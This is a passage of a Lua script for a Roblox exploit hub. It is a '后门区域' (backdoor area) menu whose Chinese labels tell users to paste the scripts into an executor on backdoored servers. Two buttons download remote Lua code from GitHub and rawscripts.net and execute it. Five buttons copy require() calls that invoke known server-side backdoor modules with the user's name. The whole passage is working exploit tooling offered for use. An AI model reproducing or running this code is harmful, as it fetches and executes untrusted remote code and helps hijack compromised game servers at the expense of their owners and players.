...
local about = UITab7:section("后门区域",true)

about:Label("后门区域仅限后门服务器使用")

about:Label("使用前先把执行器点开")

about:Label("再把脚本给复制到执行器里面")

about:Label("把脚本中用户改为自己的名字并且执行")

about:Button("执行器1",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
end)

about:Button("执行器2",function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-hub-without-hint-19587"))()
end)

about:Button("复制脚本1",function()
    setclipboard("require(6858594080).KrnKidsSus("用户")")
end)

about:Button("复制脚本2",function()
    setclipboard("require(14125553864):Fire("用户", "c00lkidd")")
end)

about:Button("复制脚本3",function()
    setclipboard("require(14829670677).EDITL0L("用户")")
end)

about:Button("复制脚本4",function()
    setclipboard("require(17340805099).ez("用户")")
end)

about:Button("复制脚本5",function()
    setclipboard("require(1714589501).v9("用户")")
end)
